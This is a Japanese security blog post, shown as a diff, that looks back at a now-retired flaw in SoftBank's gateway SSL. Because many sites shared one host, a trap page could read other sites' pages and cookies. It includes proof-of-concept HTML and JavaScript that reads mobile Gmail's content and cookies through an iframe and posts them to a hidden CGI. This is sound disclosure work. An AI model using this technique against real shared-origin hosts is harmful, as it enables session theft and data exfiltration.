@@ -1,0 +1,66 @@
+　2011年6月30日午前3時をもってソフトバンクモバイルの提供していたゲートウェイ型SSLが廃止され、End-to-EndのSSLのみになりました。廃止された方のゲートウェイ型SSLには致命的な脆弱性がありましたが、現在では使えなくなり悪用の心配もなくなりましたので、これまでどのような問題があったかを説明します。
+ソフトバンクのゲートウェイ型SSLとは　従来、ソフトバンクの携帯電話（フィーチャーフォン）では、2種類のSSLが提供されていました。通常の端末とWebサーバー間のSSL（End-to-EndのSSL）と、ゲートウェイ（secure.softbank.ne.jp）が割り込むタイプのSSLです。後者については、ソフトバンク社技術情報として仕様(削除済み)（魚拓）が公開されています。
+　ソフトバンク3G携帯電話では、「端末⇔弊社GW（以降、GW）」および「GW⇔Webサーバ」の通信区間でそれぞれSSL/TLSのセッションを確立し、GWは「端末⇔Webサーバ」間のSSL/TLSセッションの中継を行います。GWでは、Webサーバのレスポンスに含まれる、XHTMLドキュメント等に記載されたWebサーバへのhttpsリンクを、GWへのリンクに変換します。端末から見た場合、リクエストはGWへのSSLセッションとなります。
+WEB & NETWORK SSL/TLSより引用
+　わざわざSSLの場合にもゲートウェイを割り込ませている目的としては、ケータイID（UID）を付与することと、絵文字の変換があるようです。  
+※注意:EZwebにもゲートウェイ型のSSLがあります（仕様）がProxyサーバーのホスト名が見えているわけではないので、今回報告するような問題はありません。
+ゲートウェイ型SSLの問題点　ゲートウェイ型SSLが廃止されるきっかけは、高木浩光氏と、ソフトバンクモバイル取締役専務執行役員CTOの宮川潤一氏のtwitter上のやりとりであると言われています。この内容は、Togetterにまとめられています。これを読むと、ゲートウェイ方式のSSLでは、httpとhttpsでドメインが異なるため、Cookieを引き継ぐことができないことが問題として説明されています。現場のニーズとしてこの問題は大きいと思うのですが、実はもっと切実なセキュリティ上の問題がありました。
+　そのヒントは、高木浩光氏のブログ記事「共用SSLサーバの危険性が理解されていない」にあります。このエントリでは、さくらインターネットの共有SSLを題材として、ドメインを共有するサイトが、たとえCookieのPath属性を指定しても、セッションハイジャックができることが指摘されています。具体例として、以下の2つのサイトをまたがって（秘密であるはずの）コンテンツやCookieが取得できることを指摘しています。
+https://secure101.sakura.ne.jp/hoge.net/
+https://secure101.sakura.ne.jp/example.com/
+　ここでsecure101.sakura.ne.jpは、さくらインターネットの共用サーバのホスト名です。これらディレクトリをまたがったアクセスが可能である理由は、JavaScriptの同一生成元ポリシーがホストを基準としていて、ディレクトリは考慮していないからです。同一生成元ポリシーの詳細は、拙著「体系的に学ぶ 安全なWebアプリケーションの作り方（以下、徳丸本）」を参照ください。
+　ここで、secure101.sakura.ne.jpをsecure.softbank.ne.jpに置き換えたらどうでしょうか。
+https://secure.softbank.ne.jp/hoge.net/
+https://secure.softbank.ne.jp/example.com/
+　ご覧のように、ソフトバンクのゲートウェイ型SSLの書式になります。前者は共用サーバー、後者はProxyという違いはありますが、端末から見ると区別はありません。従って、高木氏が「共用SSLサーバの危険性」として指摘された問題は、そのままソフトバンクのゲートウェイ型SSLにもあります。具体的には、ソフトバンク端末の利用者に罠のページを閲覧させることにより、その利用者の秘密情報を盗み出すことが可能となります。
+　以下、Gmailの携帯電話向けページを用いて検証した画面例を使って説明します（Gmailの脆弱性ではないので、念のため）。
+検証用スクリプトの説明　検証にあたり、下図のようなページを作成しました。
+　以下に検証用スクリプトを示します。まず、画面上側のiframeと、三つ並んだボタンの部分。
+<body>
+<iframe width=400 height=300 src="../../mail.google.com/mail/" name="foo"></iframe><BR>
+<iframe width=400 height=100 src="../s.html" name="bar"></iframe><BR>
+<input type=button value="gmail" onclick="getdiv(1);">
+<input type=button value="cookie" onclick="getcookie();">
+<input type=button value="hash" onclick="getdiv(2);">
+　最初のiframeはgmailを参照しています。絶対URLは、http://secure.softbank.ne.jp/mail.google.com/mail/です。2番目のiframeは、罠ページの親ディレクトリにあるページを指しています。これは、後述する検証のためです。
+　ボタンは左から、Gmailの中味を取得、GmailのCookie取得、親ディレクトリのページの中味を取得、です。
+　続いて、検証用のスクリプトです。変数nは、例外が発生した場所を表示するためのものです。
+<script>
+function getdiv(x) { // iframeの中味を取得してtextareaに流し込み
+var n = 0; document.getElementById('out').innerHTML = ''; // エラー表示をクリア
+try {
+n = 1;
+if (x == 1) {
+var doc = foo.document;  // gmailのdocument
+} else {
+var doc = bar.document;  // 親ディレクトリページのdocument
+}
+n = 2; var body = doc.body;
+n = 3; var text = body.innerHTML;
+n = 4; document.getElementById("ta").value = text;
+} catch(e) {
+document.getElementById('out').innerHTML = n + ':' + e.message;
+}
+}
+function getcookie() { // Cookie値を取得してtextareaに流し込み
+var n = 0; document.getElementById('out').innerHTML = ''; // エラー表示をクリア
+try {
+n = 1; var doc = foo.document;
+n = 2; var cookie = doc.cookie;
+n = 4; document.getElementById("ta").value = cookie;
+} catch(e) {
+document.getElementById('out').innerHTML = n + ':' + e.message;
+}
+}
+</script>
+　関数getdivは、iframe内のbodyのinnerHTMLを取得して、そのままtextareaに流し込むものです。x=1の場合はGmail、x=2の場合は親ディレクトリのページを取得します。例外が発生した場合は行番号nとエラーの内容を表示します。
+　続いて、表示領域など残りのスクリプトです。
+<form action="/cgi-bin/xxxxxx非公開xxxx.cgi" method="POST">
+<textarea id=ta name=data1></textarea>
+<input type=submit>
+</form>
+<div id="out"></div>
+</body>
+　formはtextareaをPOSTするだけです。攻撃が成功すれば、罠に引っかかった利用者のgmailのコンテンツを取得できることになります。実際の攻撃では、ボタンを利用者に押してもらうのはイマイチなので、JavaScriptで処理することになりますが、今回は検証用なのでボタンは手で押しています。
+　罠ページと2つのiframeのURLは以下の通りです。SSLの正規の証明書がないと検証できないので、弊社のホームページ(www.hash-c.co.jp)上に置いています。罠ページのディレクトリは非公開とします。
+ソフトバンクのゲートウェイ型SSLの脆弱性を振り返る | 徳丸浩の日記
